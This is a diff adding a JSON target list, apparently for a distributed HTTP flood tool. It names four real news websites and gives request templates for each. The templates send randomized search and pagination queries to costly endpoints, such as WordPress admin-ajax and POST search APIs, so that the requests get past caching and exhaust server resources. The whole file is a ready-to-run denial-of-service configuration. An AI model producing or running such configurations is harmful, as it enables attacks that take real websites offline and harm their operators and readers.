@@ -1,0 +1,40 @@
+{
+  "targets": [
+    {
+      "target": "https://pandoraopen.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://pandoraopen.ru/?s=\"}",
+        "path_qs": "/wp-admin/admin-ajax.php?s={{str(1)}}&search_sortby=&q=&page={{int(1,100)}}&uid=0&action=load_posts&w=1723"
+      }
+    },
+    {
+      "target": "https://novorosinform.org",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://novorosinform.org/\"}",
+        "path_qs": "/ajax/loadmore?page={{int(1,10000)}}&category="
+      }
+    },
+    {
+      "target": "https://newsland.com",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "body": "{\"title\":\"{{str(1)}}\",\"cat_id\":null,\"tag_id\":null,\"offset\":{{int(1,1000)}}}",
+        "headers": "{\"Content-Type\": \"application/json\", \"Referer\": \"https://newsland.com/search\"}",
+        "path_qs": "/send",
+        "verb": "POST"
+      }
+    },
+    {
+      "target": "https://nation-news.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "body": "{\"query\":\"{{str(1)}} {{str(1)}}\",\"options\":{\"full\":true,\"limit\":{{int(1,1000)}},\"offset\":{{int(1,1000)}},\"maxDate\":1663592888,\"type\":\"byScore\",\"days\":\"365\",\"categories\":[],\"fields\":[\"title\",\"data\"]}}",
+        "headers": "{\"Content-Type\": \"application/json\", \"Referer\": \"https://nation-news.ru/search\"}",
+        "path_qs": "/html/searchPosts/render/",
+        "verb": "POST"
+      }
+    }
+  ]
+}
